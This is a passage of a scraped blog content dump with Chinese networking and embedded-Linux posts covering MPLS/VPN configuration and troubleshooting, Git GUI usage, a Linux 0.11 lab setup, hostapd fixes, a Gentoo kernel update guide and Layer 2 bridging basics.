标签栈用于报文转发，外层标签用来指示如何到达BGP下一跳 ，内层标签表示报文的出接口或者属于哪个VRF（属于哪个VPN）。 • MPLS 节点转发是基于外层标签，而不管内层标签是多少。 六、报文转发——从CE到Ingress PE • CE将报文发给与其相连的VRF接口，PE在本VRF的路由表中进行查找，得到了该路由的公网下一跳地址（即：对端PE的loopback地址）和私网标签。 • 在把该报文封装一层私网标签后，在公网的标签转发表中查找下一跳地址，再封装一层公网标签后，交与MPLS转发。 七、Ingress PE－&gt;Egress PE－&gt;CE • 该报文在公网上沿着LSP转发，并根据途径的每一台设备的标签转发表进行标签交换。 • 在倒数第二跳处，将外层的公网标签弹出，交给目的PE设备 • PE设备根据内层的私网标签判断该报文的出接口和下一跳。 • 去掉私网标签后，请报文转发给相应的VRF中的CE。 八、MPLS VPN控制流程－”私网”路由及标签传递 九、MPLS VPN控制流程－”公网”LSP的建立 PE C的loopback地址为1.1.1.1 十、MPLS VPN数据流程－私网数据包的转发 十一、MPLS/VPN招募新弟子入门考试试题 1. 在MPLS/VPN中公网标签是由（）分配的，私网标签是由（）分配的。 2. 在CE上需要运行（），在PE上需要运行（），在P上需要运行（） A. 普通的路由协议 B.MP-BGP C.MPLS 1. RD是（），RT是（），私网标签是（），公网标签是（） A.手工配置的 B.随机生成的 2. 虽然运行MPLS协议后，路由器会自动为公网路由表中的所有路由分配标签，但实际上，只需要为所有PE的loopback地址分配标签即可，不必为其他的任何公网路由分配标签。（）T or F 3. 虽然建议为不同的VPN配置不同的RD，相同的VPN配置相同的RD。但根本就别理他，只要保证存在相同地址的两个VRF的RD不同即可，不同的VPN可以配置相同的RD，相同的VPN也可以配置不同的RD。（）T or F 4. 既然已经定义了RD，就不可能存在两条相同的路由同时在网络中传播。（） 5. 对于一台PE，可能会出现接收到的不同目的地址的报文具有相同的私网标签，不可能会出现发送的不同目的地址的报文具有相同的私网标签（） 6. 一台运行MPLS的路由器如何知道自己相对于每个LSP是倒数第二跳，又如何知道自己是倒数第一跳？ 思考题：如果是BGP/GRE VPN，他的运行模式又是如何的？ 答对5题者，可入我帮，答对思考题者，可直接升为堂主。 配置 1.1、MPLS的配置 全局模式下： Lsr的ID，可以配置成与router id相同。 mpls lsr id 10.5.80.250 ! 在全局模式启动LDP协议 mpls ldp ! 在接口上启动LDP Session interface Ethernet4/1/0 ip address 10.5.3.93 255.255.255.252 mpls ldp enable 1.2、查看MPLS的邻居状态 PE3_NE16#show mpls ldp session Showing information about all sessions: Peer LDP Ident: 192.168.255.38:0; Local LDP Ident: 220.163.42.126:3 Tcp connection:192.168.255.38 - 220.163.42.66 Session State: Operational Session Role: Active Hello packets sent/received: 72121/82424 KeepAlive packets sent/received: 15018/20607 Negotiated Keepalive Timer Value: 60 Peer PV Limit: 0 LDP discovery source:GigabitEthernet4/1/0.1 1.3、查看MPLS的标签分配情况 NCC-R# show mpls lsp brief ID I/O-Label In-Interface Prefix/Mask Next-Hop 22 382/264 VT20 10.5.61.250/32 10.5.3.94 23 388/266 VT20 10.5.37.250/32 10.5.3.94 24 408/274 VT20 10.5.32.250/32 10.5.3.94 25 —/24 ———- 10.5.22.250/32 10.5.3.10 26 132/24 VT49 10.5.22.250/32 10.5.3.10 27 153/24 Eth4/1/0 10.5.22.250/32 10.5.3.10 28 155/24 Eth10/2/0 10.5.22.250/32 10.5.3.10 29 —/20 ———- 10.5.23.250/32 10.5.3.10 30 186/20 VT49 10.5.23.250/32 10.5.3.10 31 229/20 Eth4/1/0 10.5.23.250/32 10.5.3.10 2、MP-BGP配置 2.1、PE上的配置 VRF配置： ip vrf VPN-HW 创建一个VRF并命名。同时进入vrf配置模式 RD配置： 在VRF模式下，每个VRF配置一个RD，建议相同的VPN配置相同的RD。 rd 100:1 RT配置： 在VRF模式下，每个VRF配置不同的RT列表，如果只要一个RT,建议与RD配成相同。 route-target import 100:1 route-target export 100:1 2.2、将VRF与接口关连 在与某个VPN相连的接口下配置如下命令： ip vrf forwarding VPN-HW interface Serial3/5 ip vrf forwarding VPN-HW ip address 10.168.61.6 255.255.255.252 encapsulation ppp 2.3、PE与CE之间的路由协议 目前支持：RIPv2、BGP、Static，每个协议都被改造成多实例的了，换句话说，就是”VRF化”了。 Static： ip route vrf VPN-HW 10.10.1.0 255.255.255.0 10.10.1.2 ip route vrf VPN-3COM 10.10.1.0 255.255.255.0 10.10.1.2 RIPv2: router rip ! address-family ipv4 vrf VPN-HW no auto-summary network 10.0.0.0 ! address-family ipv4 vrf VPN-3COM no auto-summary network 10.0.0.0 BGP： router bgp 109 ! address-family ipv4 vrf VPN-HW neighbor 10.168.62.5 remote-as 65503 exit-address-family ! address-family ipv4 vrf VPN-3C0M redistribute static redistribute connected redistribute rip exit-address-family ! 2.4、MP-BGP的配置 router bgp 30000 no synchronization neighbor 10.5.80.240 remote-as 30000 neighbor 10.5.80.240 update-source LoopBack0 address-family ipv4 vrf VPN-HW redistribute connected redistribute static no synchronization exit-address-family address-family vpnv4 neighbor 10.5.80.240 activate exit-address-family 调试命令 一、查看VPN的路由 PE3_NE16#show ip route vrf VPN-HW VPN-HW Route Information Routing Table: VPN-HW RD: 65400:1 Destination/Mask Proto Pre Metric Nexthop Interface 1.1.1.1/32 BGP 170 0 220.163.42.62 LoopBack0 192.168.20.0/29 BGP 170 0 220.163.42.62 LoopBack0 192.168.20.0/30 BGP 170 0 220.163.42.62 LoopBack0 192.168.20.65/32 DIRECT 0 0 127.0.0.1 InLoopBack0 192.168.20.96/29 DIRECT 0 0 192.168.20.101 GE4/1/0.2 192.168.20.101/32 DIRECT 0 0 127.0.0.1 InLoopBack0 对于路由表中的BGP路由，下一跳地址是对端PE的loopback地址，出接口则是自己的loopback接口。 二、查看BGP的VPN路由 PE3_NE16#show ip bgp vpnv4 all BGP local router ID is 220.163.42.126 Status codes: s suppressed, d damped, h history, * valid, &gt; best, i internal Origin codes: i - IGP, e - EGP, ? - incomplete Network Next Hop Label(I/O) Metric LocPrf Path Route Distinguisher:65400:1 (default for vrf vpna) *&gt;i 1.1.1.1/32 220.163.42.62 0/17 100 ? *&gt;i 192.168.20.0/29 220.163.42.62 0/17 100 ? *&gt;i 192.168.20.0/30 220.163.42.62 0/16 100 ? *&gt; 192.168.20.65/32 0.0.0.0 19/0 ? *&gt; 192.168.20.96/29 0.0.0.0 18/0 ? 此命令用来查看BGP学习到的VPNv4路由的具体信息，以及私网标签的分配情况。特别是本地始发的路由（next hop 0.0.0.0）的标签分配情况，只能通过本命令查看。 三、查看私网标签命令 PE3_NE16#show mpls lsp vrf brief ID I/O-Label In-Interface Prefix/Mask Next-Hop 1 —/141|17 ———- 1.1.1.1/32 220.163.42.62 2 —/141|17 ———- 192.168.20.0/29 220.163.42.62 3 —/141|16 ———- 192.168.20.0/30 220.163.42.62 3 Record(s) Found 此命令只可以查看学习到的BGP路由的私网标签情况，对于本地始发的路由无法查看，必须通过命令 show ip bgp vpnv4 all查看。 四、Ping&amp;Telnet&amp;tracert 由于现在一台PE上存在多张路由表了，所有针对VPN路由的ping、telnet、tracert等常用命令，必须加上vrf参数，而且最好加上－a参数，指明源地址。 PE3_NE16#ping -vrf vpna -a 192.168.20.65 1.1.1.1 PE3_NE16#tracert -vrf vpna -a 192.168.20.65 1.1.1.1 PE3_NE16#telnet vrf vpna 1.1.1.1 Trouble shooting 一、MPLS/VPN的trouble-shooting 由于MPLS/VPN的报文转发是基于LSP，而LSP是依附于路由的。所以定位故障的思路是：先查路由、再查标签；先查私网、再查公网。 查看私网路由： 分别查看两端PE路由器的VRF中是否存在对端PE的VRF路由 命令： show ip route vrf 查看BGP邻居关系： 邻居状态机是否达到Established状态 命令：show ip bgp summary Neighbor V AS MsgRcvd MsgSent OutQ Up/Down State 220.163.42.62 4 65400 6818 6895 0 14h48m Established 查看公网路由： 是否在公网LSP途径的所有设备上都存在对端PE的loopback地址的精确路由？（必须是32位mask） 查看公网IGP配置： 是否通过IGP将PE的loopback地址的路由发布出去 为什么沿途设备上都必须是精确路由？ 查看私网标签： 查看本端PE路由器的私网标签是否为对端PE所分配，相关命令： • 本端 show mpls lsp vrf brief ID I/O-Label In-Interface Prefix/Mask Next-Hop • —/141|17 ———- 1.1.1.1/32 220.163.42.62 • 对端 show ip bgp vpnv4 all Network Next Hop Label(I/O) Metric LocPrf Path *&gt; 1.1.1.1/32 0.0.0.0 17/0 ? 查看MP-BGP配置、以及对端PE与CE之间的路由协议配置、双方的RT规则配置： address-family ipv4 vrf VPN-HW redistribute connected exit-address-family address-family vpnv4 neighbor 10.5.80.240 activate 查看BGP配置： 查看普通BGP的配置，是否正确的配置了BGP邻居。 查看私网路由的下一跳： 查看本地的公网路由表中是否存在私网路由的下一跳（即：对端PE的loopback地 址）的精确路由？（必须是32位mask） 查看公网标签： 查看整个LSP上的所有设备是否已经为两个PE的loopback地址正确的分配了 公网标签，相关命令：show mpls lsp brief 每台设备的入标签是否为其下 一跳的出标签。 ID I/O-Label In-Interface Prefix/Mask Next-Hop 22 382/264 VT20 10.5.61.250/32 10.5.3.94 查看LDP邻居： 查看两台相邻的PE或P路由器之间是否正确建立了LDPsession 相关命令：show mpls ldp session Session State: Operational 查看MPLS配置： 查看该设备是否在全局使能了MPLS，以及在相应的接口上使能了LDP。 全局命令： mpls lsr id 10.5.80.250! mpls ldp 在接口上启动LDP Session interface Ethernet4/1/0 mpls ldp enable http://down.51cto.com/data/97614","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"Git Gui for Windows的建库、克隆（clone）、上传（push）、下载（pull）、合并","slug":"EMBEDDED/Git Gui for Windows的建库、克隆（clone）、上传（push）、下载（pull）、合并","date":"2016-06-16T02:55:09.000Z","updated":"2017-07-10T08:44:43.918Z","comments":true,"path":"EMBEDDED/Git Gui for Windows的建库、克隆（clone）、上传（push）、下载（pull）、合并.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/Git Gui for Windows的建库、克隆（clone）、上传（push）、下载（pull）、合并.html","excerpt":"本教程将讲述：gitk的Git Gui的部分常用功能和使用方法，包括：建库、克隆（clone）、上传（push）、下载（pull - fetch）、合并（pull - merge）。 ——————————————————————————————————","text":"本教程将讲述：gitk的Git Gui的部分常用功能和使用方法，包括：建库、克隆（clone）、上传（push）、下载（pull - fetch）、合并（pull - merge）。 —————————————————————————————————————————————— 1、下载并安装 下载地址： http://code.google.com/p/msysgit/downloads/detail?name=Git-1.7.10-preview20120409.exe 安装的话，新手的话，全部“下一步（next）“即可。 2、建库（init） （如果你需要在本机计算机建库并管理自己的代码，请看此节。） 首先，新建一个文件夹，进入文件夹后点击右键，选择“Git Init Here“： 执行完这个操作后，会发现此文件夹中，多了一个“.git“的隐藏文件夹，说明执行成功。 然后，将源代码copy到此目录中（也可以直接在源代码处直接init）： 做完这个操作后，再点击鼠标右键后，点击“Git Commit Tool“，填写完commit后，点击“提交“即可： 最后，我们来看一下History，右键点击鼠标选择“Git History“： Enjoy~！(^o^)/~ 3、克隆（clone） （如果你从属于某个项目下，需要将远程的库down到本机计算机，请看此节。） 在需要建立库的目录下点击右键选择：“Git Gui” ： 在弹出窗口点击“克隆已经版本库“： 重点来了，之所以将这步称为重点，是因为网上大多数这一步的教程都错误的！ 然后在Source Location中输入完整的待克隆版本库所在地址，在Target Directory中输入或选择本地的目录（请注意此处会自动新建一个目录，不需要提前建立！） 我以ssh为例， 以下第一幅图是局域网内部为例的： 上面是局域网案例的。 下面是访问外网IP的方式： 外网访问可以需要注意几点： （1）、因为Gui的source location这里其实不能更换ssh默认端口，就算加上“:实际端口号“也会返回以下错误信息： ———————————— ssh: connect to host 123.117.67.67 port 22: Bad file numberfatal: The remote end hung up unexpectedly ———————————— （2）、不能使用~号来代替家目录的路径组成部分了，必须使用git远端库的绝对地址。 然后点击“克隆“，会提示输入ssh对应的密码： 输入密码后，就会自动克隆了，这里可能要输入3次密码，请一次次认真输入吧。成功后会提示类似信息： —————————————————————————— From 192.168.31.130:~/jmcx [new branch] master -&gt; origin/master —————————————————————————— 关闭掉当前窗口，会自动弹出git gui，然后可以在“版本库“下选择“浏览master上的文件“查看已下载文件，也可以直接去刚才的Target Directory中查看相关文件。 4、上传（push） （如果你从属于某个项目下，已经clone了远程的库，需要将本地代码修改后，上传到远端库，请看此节。） 前提条件需要满足已经完成上面的“2、建库“操作了。修改文件后，在Git Gui下进行“缓存改动“，然后输入描述，点击“提交“，点击“上传“，输入密码后回自动上传。成功应该是： 5、下载（pull - fetch） 右键在git库所在目录下打开Git Gui，在上方找到“远端（remote）“，点开之后选择“从..获取（fetch）“，自动展开后，点击“origin”： 然后输入密码，点击OK，即可完成操作： 这样就OK了，不过这样只是下载了，并没有和你本地的代码合并，要合并的话，还需要做一个操作，请看下节。 6、合并（pull - merge） fetch之后，到Git Gui的“合并（merge）“下点击“本地合并“，一般情况下是默认条件直接点击“合并（merge）“即可： ———————————————————————————————————————————— 到这里教程就告一段落了。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"Linux 0.11 实验环境","slug":"EMBEDDED/Linux 0.11 实验环境","date":"2016-06-15T00:53:40.000Z","updated":"2017-07-10T08:44:03.520Z","comments":true,"path":"EMBEDDED/Linux 0.11 实验环境.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/Linux 0.11 实验环境.html","excerpt":"可快速构建，支持Docker/Qemu/Bochs/Ubuntu/OS X/Windows 1 项目描述 该项目致力于快速构建一个 Linux 0.11 实验环境，可配合《Linux内核完全注释》 一书使用。 * 使用文档： README.m","text":"可快速构建，支持Docker/Qemu/Bochs/Ubuntu/OS X/Windows 1 项目描述 该项目致力于快速构建一个 Linux 0.11 实验环境，可配合《Linux内核完全注释》 一书使用。 使用文档： README.md&lt;/span&gt;&lt;/span&gt; 代码仓库：[https://github.com/tinyclub/linux-0.11-lab.git&lt;/span&gt;&lt;/span&gt; 基本特性： * &lt;span style=&quot;font-size:12pt&quot;&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;包含所有可用的映像文件&lt;/span&gt;&lt;span style=&quot;font-family:Times New Roman&quot;&gt;: ramfs/floppy/hard disk image&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;。&lt;/span&gt;&lt;span style=&quot;font-family:Times New Roman&quot;&gt; &lt;/span&gt;&lt;/span&gt; 轻松支持 qemu 和 bochs，可通过配置 tools/vm.cfg 切换。&lt;/span&gt;&lt;/span&gt; 可以生成任何函数的调用关系，方便代码分析：make cg f=func d=file|dir&lt;/span&gt; 支持 Ubuntu 和 Mac OS X，在 VirtualBox 的支持下也可以在 Windows 上工作。&lt;/span&gt;&lt;/span&gt; 测试过的编译器: Ubuntu: gcc-4.8， Mac OS X：i386-elf-gcc 4.7.2 在解压之前整个大小只有 30M 2 相关文章 五分钟内搭建 Linux 0.11 的实验环境](https://github.com/tinyclub/linux-0.11-lab)&lt;/span&gt; 基于 Docker 快速构建 Linux 0.11 实验环境&lt;/span&gt; 3 五分钟教程 3.1 准备 以 Ubuntu 和 Qemu 为例, 对于 Mac OS X 和 Bochs 的用法，请参考 README.md. apt-get install vim cscope exuberant-ctags build-essential qemu 3.2 下载 git clone https://github.com/tinyclub/linux-0.11-lab.git 3.3 编译 make 3.4 从硬盘启动 make start-hd 3.5 调试 打开一个终端并启动进入调试模式: make debug-hd 打开另外一个终端启动 gdb 开始调试: gdb images/kernel.sym (gdb) target remote :1234 (gdb) b main (gdb) c 3.6 获得帮助 make help &gt; Usage: make –generate a kernel floppy Image with a fs on hda1 make start – boot the kernel in qemu make start-fd – boot the kernel with fs in floppy make start-hd – boot the kernel with fs in hard disk make debug – debug the kernel in qemu &amp; gdb at port 1234 make debug-fd – debug the kernel with fs in floppy make debug-hd – debug the kernel with fs in hard disk make disk – generate a kernel Image &amp; copy it to floppy make cscope – genereate the cscope index databases make tags – generate the tag file make cg – generate callgraph of the system architecture make clean – clean the object files make distclean – only keep the source code files 3.7 生成 main 函数调用关系 make cg ls calltree/linux-0.11.jpg See:","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"头文件中的定义和声明","slug":"EMBEDDED/头文件中的定义和声明","date":"2016-06-12T06:45:46.000Z","updated":"2017-07-10T08:46:43.104Z","comments":true,"path":"EMBEDDED/头文件中的定义和声明.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/头文件中的定义和声明.html","excerpt":"定义分为变量和类型定义 头文件中最好为变量的声明、类型的定义 例: 1.如果只是用到声明，放在.h种就行了； 2.如果声明的同时并定义一个全局变量的话，在.h里用extern声明，并在对应的.c里定义。（为了防止重复定义，所以不建议在c文件","text":"定义分为变量和类型定义 头文件中最好为变量的声明、类型的定义 例: 1.如果只是用到声明，放在.h种就行了； 2.如果声明的同时并定义一个全局变量的话，在.h里用extern声明，并在对应的.c里定义。（为了防止重复定义，所以不建议在c文件中定义变量） 3.结构体是一种类型，定义一种类型最好是在.h定义，这样其他地方想用这个结构体，只需包含此.h文件即可。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"解决gentoo启动hostapd时出现的问题","slug":"EMBEDDED/解决gentoo启动hostapd时出现的问题","date":"2016-06-10T14:39:56.000Z","updated":"2017-07-10T08:44:39.015Z","comments":true,"path":"EMBEDDED/解决gentoo启动hostapd时出现的问题.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/解决gentoo启动hostapd时出现的问题.html","excerpt":"问题一： nl80211: Could not configure driver mode nl80211 driver initialization failed. hostapd_free_hapd_data: Interface wlan0 was","text":"问题一： nl80211: Could not configure driver modenl80211 driver initialization failed.hostapd_free_hapd_data: Interface wlan0 wasn’t started 解决方法 sudo nmcli nm wifi off //nmcli是NetworkManager的命令行版 UPDATE: But if for the first command you get the error message Error: Object &#39;nm&#39; is unknown then use this instead: sudo nmcli radio wifi off sudo rfkill unblock wlan sudo ifconfig wlan0 10.15.0.1/24 upsleep 1sudo service isc-dhcp-server restartsudo service hostapd restart &nbsp; &nbsp; 问题二： nl80211: Could not configure driver modenl80211: deinit ifname=wlp0s15f5u1u4 disabled_11b_rates=0nl80211 driver initialization failed.wlp0s15f5u1u4: interface state UNINITIALIZED-&gt;DISABLEDwlp0s15f5u1u4: AP-DISABLEDhostapd_free_hapd_data: Interface wlp0s15f5u1u4 wasn’t started 解决方法 rfkill list4: phy4: Wireless LANSoft blocked: noHard blocked: no &nbsp; My problem is gone now. First, I pulled out the USB WiFi device that I was using with hostapd and inserted it again, not particularly I knew what I was doing but just to make sure I didn’t miss anything obvious. That didn’t solve the problem, but it now gave me a different error message. &nbsp; Code: VLAN: vlan_set_name_type: SET_VLAN_NAME_TYPE_CMD name_type=2 failed: Package not installed&nbsp; Quick research revealed that I needed CONFIG_VLAN_8021Q in the kernel, so I enabled the following. Not sure I really needed CONFIG_VLAN_8021Q_GVRP and CONFIG_VLAN_8021Q_MVRP, but well, I just enabled them while I was there. Code: Networking supportNetworking options802.1Q/802.1ad VLAN Support (CONFIG_VLAN_8021Q)GVRP (GARP VLAN Registration Protocol) support (CONFIG_VLAN_8021Q_GVRP)MVRP (Multiple VLAN Registration Protocol) support (CONFIG_VLAN_8021Q_MVRP)&nbsp; I rebooted the system, and the newer version of hostapd worked just as well as the old one.","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"Gentoo Linux 内核更新指南","slug":"EMBEDDED/Gentoo Linux 内核更新指南","date":"2016-06-10T14:32:54.000Z","updated":"2017-07-10T08:49:10.405Z","comments":true,"path":"EMBEDDED/Gentoo Linux 内核更新指南.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/Gentoo Linux 内核更新指南.html","excerpt":"1. 简介 内核是Portage树中少数几个需要部分人工介入方可完成更新的包之一。Portage会为你下载并安装内核源码，但需要你手动编译新的内核，才能让更改生效。 这份指南是关于如何从一个内核版本更新到另一个版本的，然而，对希望切换到另一个内核包的","text":"1. 简介 内核是Portage树中少数几个需要部分人工介入方可完成更新的包之一。Portage会为你下载并安装内核源码，但需要你手动编译新的内核，才能让更改生效。 这份指南是关于如何从一个内核版本更新到另一个版本的，然而，对希望切换到另一个内核包的用户同样有用。 本文使用gentoo-sources作为例子，然而，这里的操作适用于我们树中的其他内核包。 2. 为什么更新内核？ 一般而言，小的内核版本更新不会带来什么巨大的差别。更新内核有若干原因，包括使用最新驱动或某个最新特性，免受安全漏洞威胁，或仅仅是为了保持系统始终处于最新和健康的状态。 即使你选择不是每次有新的内核版本都去更新，我们也建议你时不时的更新到最新的内核。当新内核解决了某个安全问题时，则强烈建议你更新到这一版本。 3. 通过Portage获取新的内核 更新内核源码和更新其他包一样：使用emerge工具。当在world更新列表中看到新的内核版本时，你或许希望做一次内核更新。例如： 代码 3.1: 新内核源码出现在更新列表# emerge -Dup worldCalculating dependencies …done![ebuild NS ] sys-kernel/gentoo-sources-2.6.9-r2 [2.6.8-r5]注意: 上面输出中的”NS”标志意味着，新的内核将会安装到新的slot中，也就是说旧内核源码会保留下来，直到你手动移除它。你可以继续下去，执行更新，例如：代码 3.2: 更新你的内核源码# emerge -u gentoo-sources这样，内核源码就会被安装到/usr/src的某个子目录中。对于上面的例子，新内核源码会安装在/usr/src/linux-2.6.9-gentoo-r2。4. 更新/usr/src/linux符号链接Gentoo要求符号链接/usr/src/linux指向正在运行的内核的源代码。当你emerge新内核源码时，Portage能自动更新这个链接。你需要做的是将symlink标志添加到/etc/make.conf中的USE变量中。代码 4.1: /etc/make.conf中USE变量示例（添加关键字symlink）USE=”symlink x86 3dnow 3dnowex X aac aalib adns alsa apache2”你也可以选择使用app-admin/eselect来修改该符号链接。代码 4.2: 用eselect管理符号链接（如果还没有则安装eslect）# emerge eselect（查看可用内核列表）# eselect kernel listAvailable kernel symlink targets: [1] linux-2.6.9-gentoo-r1 [2] linux-2.6.9-gentoo-r2（选择正确的内核）# eselect kernel set 1要是你真的想要自己做，下面的例子说明如何将链接指向linux-2.6.9-gentoo-r2：代码 4.3: 手动更新/usr/src/linux符号链接# cd /usr/src# ln -sfn linux-2.6.9-gentoo-r2 linux 5. 配置、编译并安装新的内核 对下面的每一种方式，你都应参考Gentoo手册中关于配置内核和配置引导程序的指示。以下是所需操作的概述： 方式一：用Genkernel自动设置内核 如果你是genkernel用户，你只需重复执行第一次安装内核时所做的步骤就可以了。 正常运行genkernel就行了： 代码 5.1: 运行genkernel # genkernel all通过附加参数，你可以使用genkernel的其他功能。例如，如果你希望用menuconfig配置额外的内核选项，并自动更新grub引导程序配置，可以如下启动genkernel： 代码 5.2: 运行genkernel时附加常用参数 # genkernel –menuconfig –bootloader=grub all更多详情，参看Gentoo Linux Genkernel指南，或者参考Gentoo手册。许多选项可以在genkernel的配置文件/etc/genkernel.conf中指定。 方式二：手动配置 首先，使用内核代码树中的menuconfig工具： 代码 5.3: 运行menuconfig # cd /usr/src/linux make menuconfig请选择你的硬件和操作环境所需的选项。更多关于内核配置的信息，参见Gentoo手册中题为配置内核的章节。 接下来，编译你的内核并复制到启动分区中。同样，请参考Gentoo手册中配置引导程序一章所列出的步骤。如果/boot是一个单独的分区，在复制编译好的内核前，确认它已挂载！否则，你就无法启动系统运行新的内核。 代码 5.4: 编译并安装新的内核 # make &amp;&amp; make modules_install mount /bootcp arch/i386/boot/bzImage /boot/bzImage-2.6.9-gentoo-r2最后，你应该更新引导程序配置文件，增加新内核的条目（先不要删除旧的！），然后卸载/boot分区。同样，参阅Gentoo手册，了解这个过程更详细的指示。 6. 重新安装外部模块 如果你使用了不包含在内核代码树，而是由Portage中其他地方提供的内核模块（例如ALSA驱动，以及NVIDIA或ATI显示驱动），那么更新内核后，你需要重新安装这些模块。很简单，只需重新emerge涉及到的包即可。更多信息，参考Gentoo手册中关于配置内核的章节。 我们为你提供了一个简易的工具（sys-kernel/module-rebuild），它能重新编译你安装的所有独立的（与/usr/src/linux的内核使用不同的ebuild）内核模块。它的用法非常直观。安装后，运行module-rebuild populate生成一个数据库，其中包含所有更新内核后需要重新编译的包的列表。当你完成更新并重新编译内核后，运行module-rebuild rebuild重新编译对应新内核的驱动。 更多信息，请不带参数运行module-rebuild，这会显示支持的命令列表。 7. 重启到新的内核 接着，关闭所有应用程序并重启系统。如果上面的步骤没有做错，那么引导程序菜单中将会出现新内核的条目。选择新的内核并启动系统。 一切顺利的话，新内核成功启动，登录后你可以继续工作了。这样的话，更新就宣告完成了。 如果你犯了错误，新内核无法启动，那么重启系统，在引导程序中选择上次可以运行的内核。接着你可以重新配置，编译并安装新内核，对错误做出适当的修正。某些情况下，你甚至无需重启就可以进行这些操作，例如少安装了声卡驱动、网卡驱动等等。 8. 运行多个内核 你可能已经注意到了，当安装新内核的源代码时，现有内核的源码没有被删除。这是有意为之的，这样你就可以很方便的在运行不同内核间切换。 在多个内核间切换非常简单。你只需保留/usr/src/中的内核源代码，并保留/boot分区中的二进制文件bzImage就可以了，后者会与引导程序配置中的一项相对应。每次启动时，你都有机会选择启动到哪个内核。 9. 删除旧的内核 接着上一节，你或许对新内核感到满意，不再需要保留旧内核了。要想删除除了最新内核外的其他版本内核源码，你可以利用emerge中的prune选项。下面是针对gentoo-sources的例子： 代码 9.1: 删除旧版本 # emerge -P gentoo-sources一般情况下，编译过程中产生的临时文件仍然会保留在/usr/src下的对应目录中。你可以安全的用rm删除这些文件。 你也可以安全的删除所有旧内核使用的模块。这能通过删除/lib/modules/目录下与删除的内核版本相应的子目录来完成。小心不要删除了还在使用的内核的模块！ 最后，你可以挂载/boot分区，删除你刚才卸载的内核的bzImage文件。你还应该编辑引导程序的配置，删去对应已卸载内核的项。 10. 高级：用你旧.config文件配置新内核 有时，配置新内核时重用旧内核的配置文件能够节省时间。需要注意的是，一般这是不安全的——每次版本更新都会带来很多改变，使得这种更新途径并不可靠。 唯一适用于这种方法的场合，是从一个Gentoo内核修订版升级到另一个。例如，从gentoo-sources-2.6.9-r1到gentoo-sources-2.6.9-r2的改变会非常微小，所以一般可以使用下面的方法。然而，这种方法不适用于本文中一直使用的例子，即从2.6.8更新到2.6.9。官方发行版本之间的改动太多，下面叙述的方法没有向用户提示足够的相关信息，这经常会导致用户因禁用了本不想禁用的选项而出现问题。 利用你旧有的.config文件，只需把它复制过来，并运行make oldconfig即可。下面的例子里，我们使用gentoo-sources-2.6.9-r1的配置文件，并用在gentoo-sources-2.6.9-r2中。 代码 10.1: 重用旧配置 # cd /usr/src/linux-2.6.9-gentoo-r2 cp ../linux-2.6.9-gentoo-r1/.config .make oldconfig 代码 10.2: 对genkernel重用旧配置 # cd /etc/kernels cp kernel-config-x86-2.6.9-gentoo-r1 kernel-config-x86-2.6.9-gentoo-r2genkernel all这时，你需要回答若干个问题，以决定在两个版本之间改变的那些配置选项。完成之后，你就可以正常编译并安装内核，不用再进行menuconfig的配置过程。 一个更加安全的办法是，同样方法复制你的配置文件，接着运行make menuconfig。这能够上面提到的make oldconfig的问题，因为make menuconfig会在菜单中中显示这个旧配置文件中尽可能多的内容。现在你所需做的就是浏览每个菜单，寻找新的选项，删除了的选项等等。通过使用menuconfig，你可以了解所有改变的相关内容，可以更容易的查看新的选择和了解帮助信息。你甚至可以用这种方法来完成例如从2.6.8到2.6.9的更新，只需保证你仔细的查看了每个选项。完成之后，正常编译并安装内核。 11. 更新内核后出现问题？ Linux内核发展迅速，版本更新带来的改变可能会引起一些问题，这是无法避免的。如果你在最新版本Gentoo支持的内核中发现了什么问题，请一定报告给我们。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"一、桥接及二层转发","slug":"EMBEDDED/一、桥接及二层转发","date":"2016-06-08T06:23:42.000Z","updated":"2017-07-10T08:46:02.197Z","comments":true,"path":"EMBEDDED/一、桥接及二层转发.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/一、桥接及二层转发.html","excerpt":"二层转发：在链路层，根据报文的目的MAC地址来对报文进行转发，因为是在链路层，我们称为二层转发。二层转发过程中不用对报文的头部做任何的修改。而三层转发则是根据报文的IP地址来进行转发，并且要对报文的二层头部进行相应的修改。 桥接：既把两台在同一网段的设","text":"二层转发：在链路层，根据报文的目的MAC地址来对报文进行转发，因为是在链路层，我们称为二层转发。二层转发过程中不用对报文的头部做任何的修改。而三层转发则是根据报文的IP地址来进行转发，并且要对报文的二层头部进行相应的修改。 桥接：既把两台在同一网段的设备通过网桥连接在一起，因为网桥就是一台二层转发的设备，通俗的讲就是根据目的MAC地址把一台设备上的报文原封不动的送给对应的另一台设备，所以说网桥设备在整个链路上是透明的。 FDB表：每个桥内都会维护一张转发信息表（FDB），转发表项包含如下信息： MAC：设备的MAC地址 port:该设备连接在交换机的哪个端口。 网桥收到报文后根据目的MAC查到表项就知道报文的出端口，直接转发出去即可。 MAC地址学习 